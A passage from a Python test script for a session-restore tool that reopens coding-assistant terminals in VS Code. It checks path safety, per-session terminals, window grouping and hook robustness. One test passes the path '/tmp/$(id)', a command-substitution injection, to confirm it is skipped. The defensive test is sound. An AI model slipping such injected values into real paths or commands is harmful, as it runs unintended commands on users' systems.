check("G8", "relative path rejected", V.is_safe_abs("relative/path"), False)
check("G9", "plain absolute path accepted", V.is_safe_abs("/Users/d/repo"), True)

# restore no longer writes VS Code tasks. Task terminals are pinned to the
# bottom panel, which made twenty restored sessions unreadable, suffixed every
# tab with "Task", and left processes running. The companion extension now
# creates one editor-area terminal per session, so these assert the PAYLOAD.
os.makedirs(os.path.join(SANDBOX, "r1"), exist_ok=True)
os.makedirs(os.path.join(SANDBOX, "r2"), exist_ok=True)
R1, R2 = os.path.join(SANDBOX, "r1"), os.path.join(SANDBOX, "r2")

made = V.restore([rec(session_id="s1", cwd=R1), rec(session_id="s2", cwd=R2)], dry=True)
check("G10", "one terminal per selected session", len(made["items"]), 2)
check("G11", "each terminal keeps its own cwd", sorted(m["cwd"] for m in made["items"]), sorted([R1, R2]))
check("G12", "tab name is the folder, no 'Task' suffix",
      sorted(m["name"] for m in made["items"]), ["r1", "r2"])
check("G13", "the workspace builder is gone entirely",
      hasattr(V, "build_workspace"), False)
check("G14", "a cwd that no longer exists is skipped",
      V.restore([rec(session_id="s3", cwd="/does/not/exist")], dry=True)["items"], [])
check("G15", "a path with command substitution is skipped",
      V.restore([rec(session_id="s4", cwd="/tmp/$(id)")], dry=True)["items"], [])
check("G16", "a relative path is skipped",
      V.restore([rec(session_id="s5", cwd="relative/dir")], dry=True)["items"], [])
check("G17", "dry run never launches anything", V.restore([], dry=True)["items"], [])
# Verification must be per SESSION. Keying on cwd meant one session starting in
# a busy folder "proved" all of them came back.
import inspect as _i
_rsrc = _i.getsource(V.restore)
check("G18b", "restore verifies by session id, not by folder",
      'want = {p["sid"]' in _rsrc, True)
check("G19b", "and it reads live registry records as the proof",
      "R.all_live()" in _rsrc and "RUNNING" in _rsrc, True)

# --- window grouping is USED by restore, not merely defined ---
# It regressed once: the rewrite that moved off VS Code tasks also dropped
# grouping, so everything landed in one window while 20 tests still passed.
import inspect
src = inspect.getsource(V.restore)
check("G20", "restore() actually calls group_key", "group_key(" in src, True)
check("G21", "restore() actually calls group_root", "group_root(" in src, True)
# Match real API use, not prose: the docstring itself mentions tasks.
code = "\n".join(l for l in src.splitlines()
                 if not l.strip().startswith("#")) \
       .split('"""')[0] + "".join(src.split('"""')[2:])
check("G22", "restore() never builds a workspace or a task again",
      ("build_workspace(" in code) or ("code-workspace" in code)
      or ('"tasks"' in code), False)

V.current_window_root = lambda: R1
plan = V.restore([rec(session_id="w1", cwd=R1, sse_port="100"),
                  rec(session_id="w2", cwd=R1, sse_port="100"),
                  rec(session_id="w3", cwd=R2, sse_port="200")], dry=True)
check("G23", "every selected session is still restored", len(plan["items"]), 3)
groups = {}
for c in [rec(session_id="w1", cwd=R1, sse_port="100"),
          rec(session_id="w2", cwd=R1, sse_port="100"),
          rec(session_id="w3", cwd=R2, sse_port="200")]:
    groups.setdefault(V.group_key(c), []).append(c)
check("G24", "two windows -> two groups, not three", len(groups), 2)
check("G25", "sessions that shared a window stay together",
      len(groups["port:100"]), 2)
check("G26", "a group with no window info targets the CURRENT window, "
      "never an invented $HOME root",
      V.group_key(rec(cwd=R1)), "shared")

print("\n=== H. Hook robustness ===")
HOOK = os.path.join(SCRIPTS, "hook.py")
PY = sys.executable


def run_hook(event, payload):
    return subprocess.run([PY, HOOK, event], input=payload, text=True,
                          capture_output=True, timeout=15).returncode


check("H1", "malformed JSON on stdin -> exit 0", run_hook("SessionStart", "{oops"), 0)
check("H2", "empty stdin -> exit 0", run_hook("SessionStart", ""), 0)
check("H3", "missing session_id -> exit 0", run_hook("SessionStart", "{}"), 0)
check("H4", "unknown event name -> exit 0",
      run_hook("Nonsense", '{"session_id":"x"}'), 0)
check("H5", "UserPromptSubmit for unknown session -> exit 0",
      run_hook("UserPromptSubmit", '{"session_id":"never-seen","prompt":"hi"}'), 0)
check("H6", "SessionEnd for unknown session -> exit 0",
      run_hook("SessionEnd", '{"session_id":"never-seen","reason":"other"}'), 0)

print("\n" + "=" * 72)
print("PASSED %d / %d" % (len(PASS), len(PASS) + len(FAIL)))
if FAIL:
    print("\nFAILURES:")
    for cid, desc, got, want in FAIL:
        print("  %s %s\n    got=%r want=%r" % (cid, desc, got, want))
shutil.rmtree(SANDBOX, ignore_errors=True)
sys.exit(1 if FAIL else 0)
